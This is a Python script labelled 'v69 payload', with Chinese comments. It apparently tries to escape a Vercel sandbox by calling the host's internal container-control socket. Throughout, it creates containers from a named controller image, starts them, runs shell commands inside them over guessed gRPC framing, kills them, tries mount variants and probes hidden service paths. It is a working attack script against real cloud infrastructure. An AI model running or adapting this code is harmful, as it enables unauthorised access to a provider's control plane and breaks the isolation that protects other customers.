# -*- coding: utf-8 -*-
"""v69 payload: 同会话 Create(drive/image) -> Start -> Exec(grpc) -> Kill + Mount 变体"""
import socket, time, os, subprocess, struct

OUT = '/vercel/sandbox/v69c.out'


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    for p in (OUT, '/mnt/h/volumes/run/vercel/share/v69c2.out'):
        try:
            open(p, 'a', encoding='utf-8', errors='replace').write(line + '\n')
        except Exception:
            pass
    try:
        print(line, flush=True)
    except Exception:
        pass


def rpc(path, body='{}', t=3):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect('/run/cell/cell.sock')
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:500].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def grpc_frame(body_bytes):
    return b'\x00' + struct.pack('>I', len(body_bytes)) + body_bytes


def pvarint(n):
    out = bytearray()
    while n > 127:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)


def pstr(field_no, s):
    b = s.encode() if isinstance(s, str) else s
    return pvarint((field_no << 3) | 2) + pvarint(len(b)) + b


def curl_grpc(path, payload, t=4):
    """HTTP/2 + grpc framing 调用 (Exec 等流式方法)"""
    try:
        tmp = '/vercel/sandbox/greq.bin'
        hdr = '/vercel/sandbox/greq_hdr.txt'
        open(tmp, 'wb').write(payload)
        cmd = ['curl', '-sS', '--max-time', str(t), '--http2-prior-knowledge',
               '--unix-socket', '/run/cell/cell.sock', '-X', 'POST',
               '-H', 'Content-Type: application/grpc', '-H', 'TE: trailers',
               '-D', hdr, '--data-binary', '@%s' % tmp, 'http://unix%s' % path]
        r = subprocess.run(cmd, capture_output=True, timeout=t + 2)
        hdrtxt = ''
        try:
            hdrtxt = open(hdr, encoding='utf-8', errors='replace').read().replace('\n', ' ')[:200]
        except Exception:
            pass
        return 'rc=%d HDR:%s BODY:%s' % (r.returncode, hdrtxt, r.stdout[:300]), r.stdout
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, b''


def main():
    log('V69 payload start pid=%d' % os.getpid())
    CTR = '/vercel.hive.cell.api.containers.v1.ContainersService'
    IMG = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'

    # 1. 创建两个容器
    id1 = id2 = None
    st, bd = rpc(CTR + '/Create', '{"drive_id":"sandbox"}')
    log('create-drive -> %s | %s' % (st, bd[:200]))
    if '"containerId"' in bd:
        id1 = bd.split('"containerId":"')[1].split('"')[0]
        log('ID1=%s' % id1)
    st, bd = rpc(CTR + '/Create', '{"image":"%s"}' % IMG)
    log('create-img -> %s | %s' % (st, bd[:200]))
    if '"containerId"' in bd:
        id2 = bd.split('"containerId":"')[1].split('"')[0]
        log('ID2=%s' % id2)

    # 2. Start
    for tag, cid in (('start-drive', id1), ('start-img', id2)):
        if cid:
            st, bd = rpc(CTR + '/Start', '{"containerId":"%s"}' % cid, t=5)
            log('%s -> %s | %s' % (tag, st, bd[:250]))
    time.sleep(2)

    # 3. Exec (grpc framing, 猜字段: container_id + argv)
    for tag, cid in (('exec-drive', id1), ('exec-img', id2)):
        if not cid:
            continue
        # 先 JSON 试
        st, bd = rpc(CTR + '/Exec', '{"containerId":"%s","process":{"argv":["/bin/sh","-c","id;hostname;pwd"]}}' % cid, t=4)
        log('%s-json -> %s | %s' % (tag, st, bd[:200]))
        # grpc 二进制: field1=container_id, field2=argv (repeated)
        req = pstr(1, cid) + pstr(2, '/bin/sh') + pstr(2, '-c') + pstr(2, 'id;hostname;pwd')
        st2, out2 = curl_grpc(CTR + '/Exec', grpc_frame(req), t=4)
        log('%s-grpc -> %s' % (tag, st2))

    # 4. Kill
    for tag, cid in (('kill-drive', id1), ('kill-img', id2)):
        if cid:
            st, bd = rpc(CTR + '/Kill', '{"containerId":"%s"}' % cid)
            log('%s -> %s | %s' % (tag, st, bd[:150]))

    # 5. Mount 变体
    for name, body in (
        ('mount-empty', '{}'),
        ('mount-img', '{"image":"%s"}' % IMG),
        ('mount-drive', '{"drive_id":"sandbox"}'),
        ('mount-ctr', '{"containerId":"%s"}' % (id2 or 'x')),
    ):
        st, bd = rpc(CTR + '/Mount', body)
        log('%s -> %s | %s' % (name, st, bd[:150]))

    # 6. celld 路径猜测
    for path in (
        '/vercel.hive.cell.api.v1.CelldService/GetDriveStorageUsage',
        '/vercel.hive.cell.v1.CelldService/GetDriveStorageUsage',
        '/vercel.hive.cell.api.celld.v1.CelldService/Configure',
    ):
        st, bd = rpc(path, '{"drive_id":"sandbox"}')
        log('guess %s -> %s | %s' % (path.split('/')[-1], st, bd[:120]))

    log('V69C_DONE')


main()
